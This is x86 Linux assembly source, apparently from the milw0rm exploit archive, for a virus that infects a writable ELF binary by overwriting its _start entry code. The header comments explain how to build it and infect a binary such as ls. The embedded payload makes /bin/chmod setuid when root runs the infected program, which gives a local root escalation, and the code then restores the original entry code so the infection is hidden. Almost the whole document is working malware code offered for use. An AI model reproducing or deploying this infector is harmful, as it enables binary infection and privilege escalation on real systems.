# gcc infR3.s -o infR3
# strip infR3
# find a writable binary (example: ls)
# ./infR3 /bin/ls
# when root calls the writable ls, chmod will be setuided
# Coded by jolmos@7a69ezine.org == sha0@BadCheckSum.com

.text
.global main
			# infeccion de _start para conseguir local root
			# use at your own risk
			#
			# Coded by jolmos@7a69ezine.org == sha0@BadCheckSum.com
			#      
			# GPLv2
main:
	push %ebp
	movl %esp, %ebp
	subl $500, %esp  	#si el codigo del bicho es mas grande, habra k ampliar este buffer

get_param:
	movl 0x0c(%ebp), %eax
	movl 4(%eax), %ebx	# ebx  ->  argv[1]

open_host:
	movl $5, %eax
	movl $2, %ecx
	int $0x80
	movl %eax, -4(%ebp)	# descriptor en -4

calc_len:
	movl $19, %eax
	movl -4(%ebp), %ebx
	xorl %ecx, %ecx
	movl $2, %edx
	int $0x80             
	movl %eax, -8(%ebp)	# longitud del host en -8

mapeo:
	movl $90, %eax
	xorl %ecx, %ecx
	pushl %ecx		# offset 0
	pushl -4(%ebp)		# descriptor 
	pushl $1		# privado     0x22
	pushl $3		# read|write  0x07
	pushl -8(%ebp) 		# size
	pushl %ecx		# nulo, para que nos indique mmap donde.
	movl %esp, %ebx
	int $0x80
	cmp $0xfffff000, %eax
	jbe ident

	# error en el mapa
	jmp ending

ident:
	movl %eax, -12(%ebp)     # -12  -> VA del mapa
				 # eax  -> VA del mapa

	cmpl $0x464c457f, (%eax)	 # es elf?
	jne  not_elf
	cmpb $0x02, 0x10(%eax)		 # es ejecutable?
	jne  not_elf	
	cmpl $0xde, 0x07(%eax)	 # comprobar si ya ha sido infectado
	je   not_elf

	movl $0xde, 0x07(%eax)	 # Marca de infeccion

guarda_init:
	movl $end_vir, %ecx
	#addl $5, %ecx
	subl $start_vir, %ecx
	movl %ecx,-16(%ebp)	# -16 -> size del virus + 5
				# ecx -> size del virus + 5

	leal -500(%ebp), %edi	# edi  -> -500
	movl 0x18(%eax), %esi	# esi  -> RVA e_entry
	movl 0x2c(%eax), %ecx	# Numero de PH's (e_phnum) (cuenta atras)

primer_ph:
	movl 0x1c(%eax), %edx	# edx  -> RVA e_phoff
	addl %eax, %edx		# edx  -> VA  e_phoff

busca_ph:
	cmpl %esi, 0x08(%edx)	# if e_entry > p_vaddr => siguiente PH
	jna destino

siguiente_ph:
	addl 0x2a(%edx), %edx
	loop    busca_ph


destino: ######### LA CLAVE DE TODO ##########
	subl 0x08(%edx), %esi   # esi  -> RVA e_entry-p_vaddr
	addl 0x04(%edx), %esi   # esi  -> RVA e_entry-p_vaddr+p_offset
	#addl $0x34, %esi	# alineacion #subl $0x30 -> _init
	                                     #addl $0x34 -> _start (p_offset)
	#subl $0x65, %esi
	addl %eax, %esi		# esi  -> VA  e_entry-p_vaddr+p_offset
	movl %esi, %edx

salvo_start:
	movl -16(%ebp), %ecx	# virus size
	rep movsb		# copiando _start en -400

guarda_virus:
	movl %edx, %edi		# edi  -> VA del entry point
	movl $start_vir, %esi	# esi  -> VA del inicio del virus
	movl -16(%ebp), %ecx	# ecx  -> size del virus
	rep movsb

	jmp sincroniza

not_elf:
	movl $4, %eax
	movl $1, %ebx
	movl $notelf, %ecx
	movl $28, %edx
	int $0x80

sincroniza:
	movl %eax, %ebx		# ebx  -> mapa
	movl $144, %eax		# eax  -> msync
	movl -8(%ebp),%ecx	# ecx  -> size del mapa
	movl $2, %edx		# edx  -> flags
	int $0x80

desmapea: 
	movl $91, %eax
	movl -12(%ebp), %ebx	# VA inicial del mapa
	movl -8(%ebp), %ecx	# size del mapa
	int $0x80

seek_end:
	movl $19, %eax		# lseek
	movl -4(%ebp), %ebx	
	xorl %ecx, %ecx
	movl $2, %edx		# SEEK_END
	int $0x80	
write:
	movl $4, %eax		
	movl -4(%ebp), %ebx
	leal -500(%ebp), %ecx
	movl -16(%ebp), %edx
	int $0x80

cierra_host:
	movl $6, %eax
	movl -4(%ebp), %ebx
	int $0x80

utime:
	#movl $30, %eax
	#int $0x80


ending:
	movl $6, %eax
	int $0x80
	
	leave
	ret

######################################################################
start_vir:
	pushal					# backup de 0x20 bytes
	subl $400, %esp				# espacio de pila de 400 bytes (total 0x1b0 bytes  0x1b0 + 4 = 0x1b4(%esp))

	call delta				# ebp  -> delta offset
delta:
	popl %ebp
	subl $delta, %ebp

payload_code:				##### PAYLOAD #####

soy_root:
	movl    $0x18, %eax	
	int	$0x80			#__NR_getuid
	test	%eax, %eax

no_pues_fuera:
	jnz	end_payload_code	

setuidar:
	movl	$0x0f, %eax		
	leal	shushi(%ebp), %ebx
	movl	$04755, %ecx
	int	$0x80			# __NR_chmod			


end_payload_code:			######################

calcula_nombre_host:
	movl $1,%edx		# edx -> length del nombre de host
	movl 0x1b4(%esp), %edi	# edi -> addr del inicio del nombre del huesped 
	xorl %ebx, %ebx
	movl $9900, %ecx

busca_path:
	cmpl %ebx, (%edi)
	je path_encontrado

	incl %edi		
	loop busca_path


path_encontrado:
	movl $100, %ecx
	decl %edi

situa_inicio_nombre:
	cmpb %bl, (%edi)
	je nombre_ok

	decl %edi
	loop situa_inicio_nombre

	
nombre_ok:
	incl %edi

desproteger_host:
        movl $125, %eax		# mprotect
        leal start_vir(%ebp), %ebx
        andl $0xfffff000, %ebx  # pagina del bicho
        movl $2000, %ecx        # 2 paginas a desproteger
	movl $7, %edx		# rwx
        int $0x80               # ahora ya tengo w ya puedo poner encima 
				# el codigo correcto de _start
desproteger_pila:
	movl $125, %eax		# mprotect
	movl %esp, %ebx
	andl $0xfffff000, %ebx  # pagina de pila
	int $0x80		# 

	
reconstruye_host:
	movl $5, %eax		# open
	movl %edi, %ebx		# argv[0]
	xorl %ecx, %ecx		# solo me puedo abrir a mi mismo en modo 0
	int $0x80		# (O_RDONLY)

       	movl $end_vir, %esi	# final-inicio+variable del final
	subl $start_vir, %esi	# esi -> virus length
	
	xorl %ecx, %ecx
	movl %eax, %ebx         # descriptor host
	movl $19, %eax          # lseek
	movl $2, %edx		# SEEK_END
	int $0x80		# nos situamos al final del host-virsize
	movl %eax, %edi		# edi -> tamanyo del host

	pushl %ecx		# offset: todo el file desde el inicio
	pushl %ebx		# descriptor
	pushl $1		# mapa privado
	pushl $1		# solo lectura (el descriptor esta modo 0)
	pushl %eax		# mapeamos todo el file
	pushl %ecx		# que me de el la address
	movl $90, %eax
	movl %esp, %ebx
	int $0x80
	cmp $0xfffff000, %eax
	jbe reconstruye

	int $3			# mapa incorrecto

reconstruye:
	addl %edi, %eax		# eax -> final del mapa
	subl %esi, %eax		# eax -> inicio del saved _start
	
	movl  %esi, virisize(%ebp)
	movl  %eax, savedstart(%ebp)

	movl $fin_paranoia, %ecx	# como que no me puedo borrar a mi 
	subl $paranoia, %ecx		# mismo, porque perderia la ejecucion
	leal paranoia(%ebp), %esi	# copio el codigo de borrado a otro
	movl %esp, %edi			# area de memoria y desvio la ejecucion
	rep movsb			# ahi.
	jmp *%esp

paranoia:
	movl virisize(%ebp), %ecx
	movl savedstart(%ebp), %esi	# optimizable
	leal start_vir(%ebp), %edi
	rep movsb

proteger_host:
        movl $125, %eax         # mprotect
        leal start_vir(%ebp), %ebx
        andl $0xfffff000, %ebx  # pagina del bicho
        movl $2000, %ecx        # 2 paginas a desproteger
        movl $5, %edx           # r-x
        int $0x80               # ahora ya tengo w ya puedo poner encima
                                # el codigo correcto de _start
proteger_pila:
	movl $125, %eax         # mprotect
	movl %esp, %ebx
        andl $0xfffff000, %ebx  # pagina de pila
	movl $6, %edx		# rw-
        int $0x80               #

	movl $6, %eax           # close
	int $0x80               # ebx descriptor


	leal start_vir(%ebp), %eax
	addl $424, %esp			# ok
	movl %eax, 8(%esp)		# ok (en el saved ebp)
	popal
	jmp *%ebp

	
fin_paranoia:

virisize:
	.long 0x00000000
savedstart:
	.long 0x00000000
shushi:
	.string "/bin/chmod\0"

end_vir:
#######################################################################

notelf:
	.string "NOT ELF OR INFECTED YET!!!\n\0"
fin:

# milw0rm.com [2006-10-08]
